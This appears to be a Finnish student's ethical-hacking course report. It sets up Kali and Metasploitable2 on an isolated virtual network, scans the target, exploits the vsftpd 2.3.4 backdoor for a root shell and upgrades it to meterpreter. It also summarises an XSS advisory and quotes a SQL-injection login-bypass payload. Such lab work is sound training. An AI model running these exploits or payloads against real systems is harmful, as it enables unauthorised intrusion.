# h3 Lab kid

Tehtävien tekemiseen käytettiin pöytäkonetta:

- Prosessori: AMD Ryzen 5 3600 6-Core Processor 3.59 GHz
- Kovalevy: 256 GB M.2 SSD, 512 GB SSD
- Muisti: 32GB RAM
- Käyttöjärjestelmä: Windows 10 Pro
- VirtualBox

Lisäksi virtuaalikoneita: Kali Linux ja Metasploitable2

Tarkemmat tehtävänannot osoitteessa: *[terokarvinen.com](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid)*

## x) Lue/katso ja tiivistä. (Tässä x-alakohdassa ei tarvitse tehdä testejä tietokoneella, vain lukeminen tai kuunteleminen ja tiivistelmä riittää. Tiivistämiseen riittää muutama ranskalainen viiva.)
€ Velu 2022: Mastering Kali Linux for Advanced Penetration Testing 4ed: Chapter 10 - Exploitation: kappaleet "The Metasploit Framework", "The exploitation of targets using Metasploit" ja "Using public exploits". Eli ei enää kappaletta "Developing a Windows exploit" ja siitä eteenpäin.

- MFS konsoli rajapinta nopein, koska se näyttää hyökkäyskomennot ja on helppokäyttöinen (sisäänpääsy: ```sudo msfconsole```)
- muodostuu eri moduuleista (exploit, payloads, auxilary modules, post modules, encoders, no operations)
- Nmap:a voidaan ajaa sisällä ```db_nmap```
- skannauksien jälkeen voidaan hyödyntää ```search``` -komentoa haavoittuvuuksien etsimiseen
- haavoittuvuutta voidaan hyödyntää ```use``` -komennolla
- riippuen kohdeportista määritellään etäyhteysosoite (RHOST) ja paikallinen osoite (LHOST), tarvittaessa etäyhteysportti (RPORT)

Vapaavalintainen läpikävely 0xdf tai ippsec (Kannattaa valita helppo; esim "Base Points: Easy") -> käytetään yhdessä tiedusteluun ja hyökkäyksiin

*[HackTheBox: Inject](https://0xdf.gitlab.io/2023/07/08/htb-inject.html)*

- Nmpan skannaus: TCP portti 8080 auki: nagios-nsca: http-sivuna "Home", voidaan tarkistaa selaimella http://$IP:8080 --> löytyy polku /upload, jonne voidaan ladata kuva
- Burp Suite työkaluna, jotta voidaan siepata verkkoliikennettä
- Testaus /index.php -> HTTP status error viittaa Tomcat:iin
- Kuvan lataaminen mahdollistaa GET-pyynnön muuntamisen /show?img=., jolloin listataan hakemistossa olevan tiedostot
- Polkua voidaan manipuloida, jotta saadaan käyttäjän kotihakemisto "../../../home/käyttäjä"
- Hyödynnetään SNYK:ä haavoittuvuuksien skannaamisen pom.xml-tiedostosta
- Kierretään Java-kerroksen virheet käyttämällä curl, jotta saadaan payload omalta hostilta, joka putkitetaan bash:iin
- shellin parannus, ja sudo-oikeuksilla sisään -> phil = staff group
- Ansible:n avulla ajo -> root-oikeuksilla shell

Nyrkkeilysäkki ei kuulu. Etsi hakukoneesta kotitehtäväraportti, jossa Kali ja Metasploitable on asennettu samaan verkkooon VirtualBoxiin; sekä testaamalla osoitettu, että koneet on saatu irti Internetistä. Tällaiset tehtävät ovat olleet jonain vuonna esimerkiksi nimillä "Nyrkkeilysäkki" ja "Ei kuulu".

- Kalille asetettu "Settings" -> "Network" Adapteri 2 host -only
- Metasploitable Adapteri 1 asetettu host -only
- Molempien nettiyhteys testattu ping 8.8.8.8

*Tunkeutumistestaus kurssi kevät/2022 h2 ([GitHub - Riku](https://github.com/rikurikurikuriku/PenTestCourse/wiki/H2-Turbo-Mode))*

## a) Asenna Kali virtuaalikoneeseen

Latasin ensin Kalin valmiina pakettina [kali.org/get-kali](https://www.kali.org/get-kali/#kali-virtual-machines)

<img src="https://github.com/jjenska/PenTest/assets/105623785/ddbc9288-317a-4237-98eb-29e848d319ee" width="300" height="300">
<img src="https://github.com/jjenska/PenTest/assets/105623785/449d9f42-da7e-471c-ac10-2ad8185f1814" width="300" height="300">


Tämän jälkeen purin tiedoston koneelleni. Tämä vaati Windows:lla 7-zip sovelluksen. Sen jälkeen VirtualBoxista:
"Tools" -> "Add" -> valittiin koneelta purettu tiedosto "kali-linux-2023.3-virtualbox-amd64"
VirtualBox teki kaiken valmiiksi, joten starttasin koneen ja kirjauduin sisään valmiiksi annetuilla tunnuksilla. *([Kali - default credentials](https://www.kali.org/docs/introduction/default-credentials/))*

Oletuksena koneessa oli USA:n näppäimistö, joten vaihdoin suomeksi *([jatcwang - layouts](https://gist.github.com/jatcwang/ae3b7019f219b8cdc6798329108c9aee))*:

```console
┌──(kali㉿kali)-[~]
└─$ sudo setxkbmap -layout fi 
```
Päivitin myös kaikki paketit

```console
┌──(kali㉿kali)-[~]
└─$ sudo apt-get update
┌──(kali㉿kali)-[~]
└─$ sudo apt-get -y dist-upgrade
```

## b) Asenna Metasploitable 2 virtuaalikoneeseen

Minulla oli jo Metasploitable2 asennettuna, mutta poistin sen ja tein asennuksen uudelleen. Latasin Metasploitable2:n osoiteesta *[sourceforge.net](https://sourceforge.net/projects/metasploitable/)*
Lataamisen jälkeen purin tiedoston koneelleni. VirtualBoxista valitsin "New":
```
Name: Metasploitable2
Type: Linux
Version: Other Linux (64-bit) 
RAM: 512MB
```

Tämän jälkeen valitsin "Use an Existing Virtual Hard Disk File" ja tiedostoista purettu Metasploitable2

![meta2](https://github.com/jjenska/PenTest/assets/105623785/c1fd95bc-eabe-4c28-956c-b9da41cb0888)

## c) Tee koneille virtuaaliverkko, jossa Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä. Osoita eri komennoilla, että Internet-yhteys katkeaa.

Kalilla valitsin "Settings" -> "Network". Adapteriksi 1 valitsin NAT, jotta Kali saa langattoman yhteyden internettiin tarvittaessa. Minulla oli jo valmiiksi määriteltynä Host only virtuaaliverkko.  

Se siis määritelty: "Tools" -> "Network" -> "Create". Tämän lisäksi DHCP-server "Enable Server".

Näin ollen asetin Kalin toiseksi adapteriksi "Host -only" ja nimi kohdasta valitsin luomani virtuaaliverkon "VirtualBox Host-Only Ethernet Adapter #2". Metasploitable:n asetuksista valitsin adapteri 1 kytkennäksi ainoastaan "Host -only", sekä luomani virtuaaliverkon, jotta se ei olisi kytkettynä internettiin. Tämän jälkeen käynnistin ensin Kalin. Työpöydältä klikkasin oikeasta alapalkista network-kuvaketta. 
Sieltä nappasin adapterin 1 irti. 

![networkadpt](https://github.com/jjenska/PenTest/assets/105623785/4722825b-35b4-4e1d-aeae-ecb0326ad296)

Testasin ping 8.8.8.8, sekä curl google, jotta internet-yhteyttä ei ole:

```console
┌──(kali㉿kali)-[~]
└─$ ping 8.8.8.8 
ping: connect: Network is unreachable
┌──(kali㉿kali)-[~]
└─$ curl www.google.com
curl: (6) Could not resolve host: www.google.com
```
Käynnistin Metasploitablen. Käyttäjätunnukset ja muu hyödyllinen dokumentaatio löytyi osoitteesta: *[docs.rapid7.com/metasploit](https://docs.rapid7.com/metasploit/metasploitable-2)*

```
admin käyttäjätunnukset
login admin: msfadmin
password: msfadmin
```

Ensin testasin internet-yhteyden pingaamalla 8.8.8.8, ja sain vastaukseksi "connect: Network is unreachable". Lisäksi testasin curl:lla, ja tarkistin Metasploitable2:n IP-osoitteen:

```console
msfadmin@metasploitable:~$ curl www.google.com
curl: (6) Couldn't resolve host 'www.google.com'
msfadmin@metasploitable:~$ ifconfig
```
Pingasin Metasploitable2:n Kalilta. Yhteys koneeseen oli toiminnassa:

```console
┌──(kali㉿kali)-[~]
└─$ ping 192.168.60.8                           
PING 192.168.60.8 (192.168.60.8) 56(84) bytes of data.
64 bytes from 192.168.60.8: icmp_seq=1 ttl=64 time=0.290 ms
64 bytes from 192.168.60.8: icmp_seq=2 ttl=64 time=0.184 ms
64 bytes from 192.168.60.8: icmp_seq=3 ttl=64 time=0.244 ms
64 bytes from 192.168.60.8: icmp_seq=4 ttl=64 time=0.196 ms
64 bytes from 192.168.60.8: icmp_seq=5 ttl=64 time=0.228 ms
^C
--- 192.168.60.8 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4089ms
rtt min/avg/max/mdev = 0.184/0.228/0.290/0.037 ms
```

## d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.

Laitoin PostrgreSQL:n pyörimään ensin Kali:n *[ohjeilla](https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/#msfdb)*, jonka jälkeen käynnistin mfsconsole:n.

```console
┌──(kali㉿kali)-[~]
└─$ sudo msfdb init             
[sudo] password for kali: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

```console
┌──(kali㉿kali)-[~]
└─$ msfconsole     
Metasploit tip: You can pivot connections over sessions started with the 
ssh_login modules
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]                                                                           
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]                                                                           
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]                                                                           
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]                                                                           
                                                                             

       =[ metasploit v6.3.41-dev                          ]
+ -- --=[ 2371 exploits - 1230 auxiliary - 414 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

Näytti siltä, että pääsin onnistuneesti sisään. Dokumentaation perusteella ymmärsin myös, että Kalilla voitaisiin ajaa ```sudo msfdb run```, joka tekisi kyseiset askeleet suoraan. Kokeilin myös ```db_status```, jolloin sain ilmoituksen "Connected to msf. Connection type: postgresql.". Tämän jälkeen skannasin Metasploitable2:n aiemmin tarkistamani IP-osoitteen perusteella.

```console
msf6 > db_nmap -sn 192.168.60.8
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 05:22 EST
[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
[*] Nmap: Nmap scan report for 192.168.60.8
[*] Nmap: Host is up (0.0054s latency).
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.01 seconds
```
Vastaukseksi sain, että kyseinen osoite on ylhäällä. Katsoin vielä selaimen kautta IP:n, joka näytti etusivun:

![meta2port](https://github.com/jjenska/PenTest/assets/105623785/e58def72-f320-41f2-ab35-5ccd5b00d992)

## e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.

Aloitin perusteellisen skannauksen, jonka jälkeen ehdin jo miettiä eikö homma toimi. Tovin odottelun jälkeen sain tulokset, aikaa kului päälle 2 minuuttia.

```console
msf6 > db_nmap -A -p0- 192.168.60.8
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-10 05:33 EST
[*] Nmap: 'mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers'
[*] Nmap: Nmap scan report for 192.168.60.8
[*] Nmap: Host is up (0.00026s latency).
[*] Nmap: Not shown: 65506 closed tcp ports (conn-refused)
[*] Nmap: PORT      STATE SERVICE     VERSION
[*] Nmap: 21/tcp    open  ftp         vsftpd 2.3.4
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: | ftp-syst:
[*] Nmap: |   STAT:
[*] Nmap: | FTP server status:
[*] Nmap: |      Connected to 192.168.60.7
[*] Nmap: |      Logged in as ftp
[*] Nmap: |      TYPE: ASCII
[*] Nmap: |      No session bandwidth limit
[*] Nmap: |      Session timeout in seconds is 300
[*] Nmap: |      Control connection is plain text
[*] Nmap: |      Data connections will be plain text
[*] Nmap: |      vsFTPd 2.3.4 - secure, fast, stable
# ....
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 137.60 seconds
```

Tulosteessa näkyi useita avoimia portteja, joiden palveluiden versiot ovat todennäköisesti vanhoja, sisältäen haavoittuvuuksia. Ylipäätään useat avoimet portit ovat mahdolliselle hyökkääjälle tärkeä löytö, jotta niiden hyväksikäyttöä voidaan lähteä kartoittamaan.

## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)

Aikaisemmassa tulosteessa näkyi, että FTP kuuntelee TCP-porttia 21. Sieltä löytyy versio numero 2.3.4 jolla tein haun:

```console
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor 
```
Kyseisessä tulosteessa hakusanat oli korostettu värillä. Vaihtoehtona oli vain yksi rivi, joten ajoin:

```console
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
Metasploitin *[dokumentaatiosta](https://docs.metasploit.com/docs/pentesting/metasploit-guide-setting-module-options.html)* löytyi myös komento "show options" tai "options", joka näyttää, mitä vaihtoehtoja mooduliin voidaan asettaa ennen sen ajamista. Tämän jälkeen voidaan myös valita "info", mikäli tietoja halutaan tarkastella tarkemmin. Asetin hyökkäyksen kohteeksi Metasploitable2:n, ja käynnistin sen:

```console
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.60.8
RHOSTS => 192.168.60.8
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit 

[*] 192.168.60.8:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.60.8:21 - USER: 331 Please specify the password.
[+] 192.168.60.8:21 - Backdoor service has been spawned, handling...
[+] 192.168.60.8:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.60.7:46737 -> 192.168.60.8:6200) at 2023-11-10 06:40:20 -0500
```
Vastauksena sain "Found shell", jonka jälkeen tieto, että komentorivi-yhteys oli avattu. Testasin vielä kuka olen, ja millä oikeuksilla, sekä listasin Metasploitable2:n hakemistot. Hyökkäys onnistui, sillä olin sisällä "as root".

```console
id
uid=0(root) gid=0(root)
ls
bin
boot
cdrom
dev
etc
home
# jne ...
```

## g) Parempi sessio. Tee vsftpd-hyökkäyksestä saadusta sessiosta parempi. (Voit esimerkiksi päivittää sen meterpreter-sessioksi, laittaa tty:n toimimaan tai tehdä uuden käyttäjän ja ottaa yhteyden jollain tavallisella protokollalla)

Lähteenäni oli ohjeet: *[infosecwriteups - upgrade normal shell to meterpreter](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646)*
Ensin siirsin avaamani session (1) taustalle painamalla ```ctrl``` + ```Z```. Tämän jälkeen terminaali pyysi:

```console
Background session 1? [y/N]  y
```

Tämän jälkeen etsin Meterpreter shellin päivityksem komennolla:

```console
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter 
```

Sitten listasin istunnot ```sessions -l```, jotta pystyisin valitsemaan päivitettävän istunnon id:n perusteella. Tässä vaiheessa pystyi hyödyntämään "show options", joka näyttää mitä moduulin vaihtoehtoja käytetään.

```console
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               192.168.60.7:36411 -> 192.168.60.8:6200 (192.168.60.8)
```

Eli komennoksi asetin oman aktiivisen istunnon id:n ```set sessions 1```, jonka jälkeen ```run```.

```console
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.60.7:4433 
[*] Sending stage (1017704 bytes) to 192.168.60.8
[*] Meterpreter session 2 opened (192.168.60.7:4433 -> 192.168.60.8:59446) at 2023-11-10 15:18:22 -0500
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
```
Tässä vaiheessa tuloste ilmoitti, että päivitetään istuntoa 1, jonka jälkeen Meterpreter istunto 2 on avattiin. Tämän jälkeen listasin taas aktiiviset istunnot:

```console
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                     Connection
  --  ----  ----                   -----------                     ----------
  1         shell cmd/unix                                         192.168.60.7:36411 -> 192.168.6
                                                                   0.8:6200 (192.168.60.8)
  2         meterpreter x86/linux  root @ metasploitable.localdom  192.168.60.7:4433 -> 192.168.60
                                   ain                             .8:59446 (192.168.60.8)
```

Istunnon pystyi vaihtamaan komennolla ```sessions -i```, määrittelemällä vielä loppuun halutun id:n. Näin päivitys onnistui:

```console
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > 
```

## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)

Valitsin hyökkäykseksi *[Boom CMS v8.0.7 - Cross Site Scripting](https://www.exploit-db.com/exploits/51612)*

> "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.
> XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user.
> Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it."
> 
> *[OWASP - attacks:xss](https://owasp.org/www-community/attacks/xss/)*

Boom on sisällönhallintajärjestelmä (CMS). Se antaa editoijille hallinnan, mutta ei vaadi teknistä osaamista. 
The vulnerability laboratory löysi sovelluksesta pysyvän cross-site haavoittuvuuden, jonka vakavuustaso oli kohtalainen. 
Tämä haavoittuvuus sijaitsi tekstinsyöttökentissä, joihin asetettiin albumin nimi ja kuvaus. 
Hyökkääjät, joilla oli rajatut käyttöoikeudet pystyivät lisäämään omia viallisia albumeita, jotka sisälsivät vahingollista script-koodia sekä albumin nimessä, että kuvauksessa.
Haavoittuvuuden onnistunut hyödyntäminen johti mm. istuntojen kaappaukseen ja kalasteluhyökkäyksiin.

- Pyynnön metodi:
  - POST
- Haavoittuva moduuli:
  - assets-manager (album)
- Haavoittuva funktio:
  - add
- Haavoittuvat parametrit:
  - nimi
  - kuvaus
- Vaikutus moduuleihin:
  - Frontend (Albums)
  - Backend(Album Assets)
 
Haavoittuvuuden toistettavuuden askeleet:

1. Kirjautuminen sovellukseen rajatuilla käyttöoikeuksilla
2. Uuden albumin luominen
3. Testi script koodi tietosisällön injektoiminen albumin nimeen ja kuvaukseen
4. Pyynnön tallentaminen
5. Frontend albumien ja backendin (assets-manager & albumilistaus) esikatselu, joka saa aikaan skriptin suorittamisen
6. Haavoittuvuuden onnistunut toistaminen


## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)

Searchsploit löytyi Kalista valmiiksi *([terokarvinen.com](https://terokarvinen.com/2023/eettinen-hakkerointi-2023/#h3-lab-kid))*. Ensimmäiseksi päivitin sen *([ExploitDB - searchsploit](https://www.exploit-db.com/searchsploit))*.

```console
┌──(kali㉿kali)-[~]
└─$ searchsploit -u
[i] Updating via apt package management (Expect weekly-ish updates): exploitdb

Get:1 http://kali.download/kali kali-rolling InRelease [41.2 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.5 MB]
Get:3 http://kali.download/kali kali-rolling/main amd64 Contents (deb) [46.2 MB]
Fetched 65.7 MB in 8s (8659 kB/s)                                                                  
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
Reading package lists... Done
# ... useita rivejä
[*] apt update finished
```
Kokeilin käyttää hakuna ```searchsploit ssh```, joka antoi useita rivejä tuloksia. Tarkastelin muutamia tiedostoja, mutta osa vaikutti liian korkealentoiselta omaan osaamiseen. Päätin siis ottaa SQL-injektio esimerkin, koska niitä oltiin jo sivuttu aikaisemmin. Hauksi laitoin ```searchsploit sql```, ja bongasin "airbnb", joten lisäsin sen hakuun rajatakseni tuloksia.

```console
┌──(kali㉿kali)-[~]
└─$ searchsploit sql airbnb   
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Airbnb Clone Script - Multiple SQL Injection                                                                                                                 | php/webapps/46616.txt
Airbnb Crashpadder Clone Script - SQL Injection                                                                                                              | php/webapps/41817.txt
AirStar Airbnb Clone Script 1.0 - SQL Injection                                                                                                              | php/webapps/42659.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Tämän jälkeen kopioin valitsemani hyökkäyksen omaan hakemistooni, tulosteen oikea sarake "PATH" näytti, mistä kyseinen exploit löytyy:

```console
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/exploitdb/exploits/php/webapps/46616.txt /home/kali/Documents 
```

Tämän jälkeen siirryi kotihakemistoon ja avasin tiedoston ```cat 46616.txt```. Tiedosto sisälsi useamman injektioesimerkin weppipalveluun. Otin tarkasteluun:

```
----- PoC 6: SQLi (Authentication Bypass -----

Administration Panel: http://localhost/[PATH]/admin/
Username: '=' 'or'
Password: '=' 'or' 
```

Kyseessä on XPATH-injektio, jossa ohitetaan käyttäjätunnus ja salasana. Jos ymmärsin Hacktrick:n *[ohjeiden](https://book.hacktricks.xyz/pentesting-web/xpath-injection)* mukaan tässä:
- ```username='' or '1'='1'```
- ```password='' or '1'='1'``` -> eli arvo on tyhjä tai true, josta jälkimmäinen toteutuu aina

Näin ollen kirjautumaan pääsisi suoraan admin-tunnuksilla.


## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)

Päätin kokeilla ensimmäistä vaihtoehtoa, eli Niktoa. *[Dokumentaatiosta](https://github.com/sullo/nikto/wiki/Install-Unix)* löytyikin tieto, että Nikto löytyy Kalilta valmiiksi asennettuna. Tarkistin versioni:

```console
┌──(kali㉿kali)-[~]
└─$ nikto -V
Nikto 2.5.0 (LW 2.5)
```
Lisäksi *[dokumentaatiossa](https://github.com/sullo/nikto/wiki/Kali-%28Special-Notes%29)* oli maininta, että ongelmatapauksissa se ei tue Kalia, ellei sovellusta ole ladattu Githubista ja asennettu manuaalisesti (versio voi myös olla jäljessä). 2.5.0 näytti kuitenkin olevan GitHub:a vastaava. GitHub:n dokumentaatiosta löytyi myös listaus komennoista. Nikto -Help tulosti terminaaliin tarkemmat ohjeet.
Kaikista yksinkertaisin skannaustekniikka skannaa oletuksena portin 80. Skannaukselle tulee määritellä joko palvelun IP-osoite tai hostname. *([GitHub - Nikto: Basic Testing](https://github.com/sullo/nikto/wiki/Basic-Testing))*. Toteutin skannaukseni siis:

```console
┌──(kali㉿kali)-[~]
└─$ nikto -h 192.168.60.8
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.60.8
+ Target Hostname:    192.168.60.8
+ Target Port:        80
+ Start Time:         2023-11-10 06:55:29 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /doc/: Directory indexing found.
+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 12:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /test/: Directory indexing found.
+ /test/: This might be interesting.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /phpMyAdmin/: phpMyAdmin directory found.
+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2023-11-10 06:55:44 (GMT-5) (15 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
``` 
Tulostuksessa näkyi kohteen IP-osoite, sekä oletusportti 80. Palveluna oli Apache 2.2.8. Mahdollisia haavoittuvuuksia tulostui pitkä lista. Esimerkiksi HTTP TRACE metodi, joka voi altistaa cross site tracingiin. Lisäksi alariveillä näkyy esim. php admin hakemiston löytyminen.
Kätevä ominaisuus oli mahdollisuus tallentaa skannauksen tulokset tiedostoon, kuten Nmap:ssa. Nikto tukee useampaa eri formaattia, mm. CSV, HTML, XML, JSON, SQL *[GitHub - Nikto: Export Formats](https://github.com/sullo/nikto/wiki/Export-Formats))*.

```console
┌──(kali㉿kali)-[~]
└─$ cd /home/kali/Documents 
                                                                                                    
┌──(kali㉿kali)-[~/Documents]
└─$ nikto -h 192.168.60.8 -output testidata -Format json
┌──(kali㉿kali)-[~/Documents]
└─$ cat testidata          
{"host":"192.168.60.8","ip":"192.168.60.8","port":"80","banner":"Apache/2.2.8 (Ubuntu) DAV/2","vulnerabilities":[{"id": "999986","method":"GET","url":"","msg":"/: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10."}, 
# jatkuu...
```

## k) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.

